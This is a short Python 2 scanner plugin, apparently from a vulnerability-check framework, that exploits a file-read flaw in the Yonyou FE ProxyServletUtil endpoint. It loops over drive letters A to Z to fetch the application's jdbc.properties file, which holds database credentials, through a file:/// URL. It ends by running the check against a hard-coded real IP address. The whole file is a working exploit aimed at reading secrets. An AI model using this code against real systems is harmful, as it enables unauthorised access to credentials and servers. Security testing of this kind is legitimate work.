#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-082455

def assign(service, arg): 
    if service == "yongyou_fe":
        return True, arg
		
def audit(arg): 
    url = 'ProxyServletUtil?url=file:///'
    code, head, res, errcode, _ = curl.curl2(arg+url)
    if code == 500:
        #a-z遍历
        for fuzz in xrange(0x41, 0x5B):
            payload = 'ProxyServletUtil?url=file:///'+unichr(fuzz)+':/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties'
            code, head, res, errcode, _ = curl.curl2(arg+payload)
            #print unichr(fuzz)
            if code == 200 and 'jdbc' in res:
                security_hole('File read vulnerability '+ arg + payload)                
                break
                
if __name__ == '__main__': 
    from dummy import *
    audit(assign('yongyou_fe', 'http://119.97.198.27:8080/')[1])
	
